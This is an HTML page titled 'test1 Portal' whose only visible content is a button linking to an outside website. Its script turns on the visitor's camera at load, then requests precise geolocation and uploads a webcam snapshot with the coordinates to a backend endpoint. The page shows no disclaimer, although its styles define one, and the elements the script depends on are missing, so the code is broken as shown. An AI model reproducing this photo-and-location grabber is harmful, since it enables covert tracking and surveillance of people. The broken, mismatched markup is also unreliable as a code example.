<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test1 Portal</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f9; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1 { color: #111; margin-bottom: 10px; }
        .disclaimer { background-color: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; border: 1px solid #ffeeba; text-align: left; line-height: 1.4; }
        video { border-radius: 8px; width: 100%; background-color: #222; margin-bottom: 15px; border: 2px solid #ddd; }
        button { padding: 14px 24px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #000; color: white; border: none; border-radius: 8px; transition: background 0.3s; width: 100%; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }
        button:hover:not(:disabled) { background-color: #333; }
        #statusMessage { margin-top: 15px; font-weight: bold; font-size: 15px; }
    </style>
</head>
<body>

    <div class="container">
        
        <button id="sendDataBtn" disabled><a href="https://walidirhil.github.io/-EUREKA/" target="_blank">Go to website</a></button>
    </div>

    <script>
        const video = document.getElementById('videoFeed');
        const canvas = document.getElementById('photoCanvas');
        const sendBtn = document.getElementById('sendDataBtn');
        const statusText = document.getElementById('statusMessage');

        // 1. Start Camera Safely
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // Wait for the video to actually start playing before enabling the button
                video.onloadedmetadata = () => {
                    sendBtn.innerText = "Send Photo & Location";
                    sendBtn.disabled = false;
                };
            } catch (err) {
                showError("Camera access denied. Please allow camera permissions in your browser.");
            }
        }

        // 2. Handle Button Click
        sendBtn.addEventListener('click', async () => {
            sendBtn.disabled = true;
            sendBtn.innerText = "Getting Location...";
            statusText.innerText = "";

            if (!navigator.geolocation) {
                return showError("Geolocation is not supported by your browser.");
            }

            // Request Location
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    await captureAndSend(locationData);
                },
                (error) => {
                    showError("Location access denied. We need your location to proceed.");
                    sendBtn.disabled = false;
                    sendBtn.innerText = "Try Again";
                },
                { enableHighAccuracy: true, timeout: 10000 } // Force better accuracy
            );
        });

        // 3. Take Photo and Send to Vercel
        async function captureAndSend(locationData) {
            try {
                sendBtn.innerText = "Uploading to test1...";
                
                // Set canvas size to match video exactly
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');

                // Send to backend
                const response = await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, location: locationData })
                });

                const result = await response.json();

                if (response.ok) {
                    statusText.innerText = "✅ Success! Data sent to test1.";
                    statusText.style.color = "green";
                    sendBtn.innerText = "Sent!";
                } else {
                    throw new Error(result.error || "Server rejected the data.");
                }

            } catch (err) {
                showError("Upload Failed: " + err.message);
                sendBtn.disabled = false;
                sendBtn.innerText = "Try Again";
            }
        }

        function showError(msg) {
            statusText.innerText = "❌ " + msg;
            statusText.style.color = "red";
        }

        // Initialize on page load
        startCamera();
    </script>

</body>
</html>
